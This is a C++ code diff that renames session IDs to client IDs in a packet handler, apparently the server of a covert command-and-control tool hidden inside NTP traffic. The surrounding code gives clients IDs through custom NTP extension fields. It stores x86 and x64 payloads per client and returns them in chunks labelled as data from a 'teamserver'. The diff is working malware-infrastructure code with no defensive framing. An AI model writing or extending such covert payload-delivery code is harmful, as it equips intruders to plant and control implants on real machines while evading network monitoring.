@@ -23,8 +23,6 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
         << inet_ntoa(client_addr->sin_addr) << ":"
         << ntohs(client_addr->sin_port) << std::endl;
 
-    //std::cout << "Theoretical Client ID" << generateClientID() << std::endl;
-
     //1. Run some checks to make sure an extension field exists, and extract it if so
 
     //2 seperate for different error messages. Could just be the < 52 one as well.
@@ -58,13 +56,12 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
     std::array<uint8_t, 2> ntpPacketExtensionField = ntpPacket.getExtensionField();
     //standard here: print debug header of packet type, then printthe packet
 
-    //Extract client ID and stuff out, do class checks to see if it exstsi, and setup for further action
-    //std::vector<uint8_t> sessionId;
-    //sessionId.insert(sessionId.begin(), packet.begin() + 4, packet.begin() + 8); //copies between byte 4 and 8, 
-    //std::cout << "[?] Session ID: ";
-    std::vector<uint8_t> sessionId = ntpPacket.getExtensionSessionId();
-    printHexVector(sessionId); //sanity debug check
-
+    //Extract client ID and stuff out, do class checks to see if it exists, and setup for further action
+    std::vector<uint8_t> clientId = ntpPacket.getExtensionClientId();
+    //sanity debug
+    std::cout << "[?] Client Session ID: ";
+    printHexVector(clientId); 
+    std::cout << std::endl;
 
     //2. Do different actions based on what type of packet/extension field is coming in
     if (ntpPacketExtensionField == NtpExtensionField::giveMePayload) {
@@ -94,12 +91,12 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
             std::vector<uint8_t> payload = getx86Payload();
 
             //need to convert vector to uint32 cuz that's what find needs
-            uint32_t uintSessionId = vectorToUint32(sessionId);
+            uint32_t uintClientId = vectorToUint32(clientId);
 
             //lookup client class
             std::cout << "Printing Sesions: ";
-            printSessionIDs(sessions);
-            auto it = sessions.find(uintSessionId);
+            printClientIDs(sessions);
+            auto it = sessions.find(uintClientId);
             if (it != sessions.end()) {
                 it->second.setForClientBuffer(payload);
 
@@ -120,7 +117,7 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
                 newPacketClass.addExtensionField(
                     NtpExtensionField::sizePacket,
                     sizeOfDataButAsAVectorBecauseEverythingIsAVector,
-                    Client::emptySessionId //using empty sesion ID to fit spec
+                    Client::emptyClientId //using empty sesion ID to fit spec
 
                 );
 
@@ -131,7 +128,7 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
             }
             else {
                 std::cout << "[?] Could not find client class: ";
-                printHexVector(sessionId);
+                printHexVector(clientId);
             }
         }
 
@@ -141,7 +138,7 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
             std::vector<uint8_t> payload = getx64Payload();
 
             //create or access client class - currnetly only creates
-            ClientSession someClient(sessionId);
+            ClientSession someClient(clientId);
             someClient.setForClientBuffer(payload);
             std::cout << "[?] Stored payload in client class";
             //printHexVector(someClient.getForClientBuffer());
@@ -156,7 +153,7 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
             newPacketClass.addExtensionField(
                 NtpExtensionField::sizePacket,
                 sizeOfDataButAsAVectorBecauseEverythingIsAVector,
-                Client::emptySessionId //using empty sesion ID to fit spec
+                Client::emptyClientId //using empty sesion ID to fit spec
 
             );
 
@@ -172,18 +169,18 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
             //access class and get next chunk to send back. client must have req'd 0x86 or 0x64 FIRST, otherwise itll be empty.  
             //need to figure out class logic to see if a class exists. Maybe a basic factory that searches it or creates one, as a function.
 
-            //need to convert sessionId to uint32 as that's what is hashed
-            //uint32_t convertedSessionId;
-            //std::memcpy(&convertedSessionId, sessionId.data(), sizeof(convertedSessionId));
-            uint32_t convertedSessionId = vectorToUint32(sessionId);
+            //need to convert clientId to uint32 as that's what is hashed
+            //uint32_t convertedClientId;
+            //std::memcpy(&convertedClientId, clientId.data(), sizeof(convertedClientId));
+            uint32_t convertedClientId = vectorToUint32(clientId);
 
-            std::cout << "[?] Looking up class by key: " << convertedSessionId << std::endl;
+            std::cout << "[?] Looking up class by key: " << convertedClientId << std::endl;
 
             // Attempt to find key
-            auto it = sessions.find(convertedSessionId);
+            auto it = sessions.find(convertedClientId);
             if (it != sessions.end()) {
                 //std::cout << "Found: " << it->second << "\n";
-                std::cout << "[?] Class exists for " << convertedSessionId << std::endl;
+                std::cout << "[?] Class exists for " << convertedClientId << std::endl;
                 //get next chunk - need to figure otu chunk size here too
                 std::vector<uint8_t> nextChunk = it->second.getNextChunk(Chunk::maxChunkSize);
                 //send back
@@ -193,7 +190,7 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
                 responsePacketClass.addExtensionField(
                     NtpExtensionField::dataFromTeamserver, //is this the best way to get this back? Maybe a dedicated header specifying payload
                     nextChunk,
-                    Client::emptySessionId //using empty sesion ID to fit spec
+                    Client::emptyClientId //using empty sesion ID to fit spec
 
                 );
 
@@ -241,7 +238,7 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
         idPacket.addExtensionField(
             NtpExtensionField::idPacket,
             clientIdVector,
-            Client::emptySessionId //using empty sesion ID to fit spec
+            Client::emptyClientId //using empty sesion ID to fit spec
 
         );
 
@@ -277,7 +274,7 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
 
         std::cout << "[?] getIdPacket recieved, Generating ID" << std::endl;
 
-        //This is also known as sessionId, probbably need to change everywhere to ClientID
+        //This is also known as clientId, probbably need to change everywhere to ClientID
         uint32_t clientID = generateClientID();
         std::cout << "[?] Client ID: " << clientID << std::endl;
         
@@ -301,7 +298,7 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
         idPacket.addExtensionField(
             NtpExtensionField::idPacket,
             clientIdVector,
-            Client::emptySessionId //using empty sesion ID to fit spec
+            Client::emptyClientId //using empty sesion ID to fit spec
 
         );
 
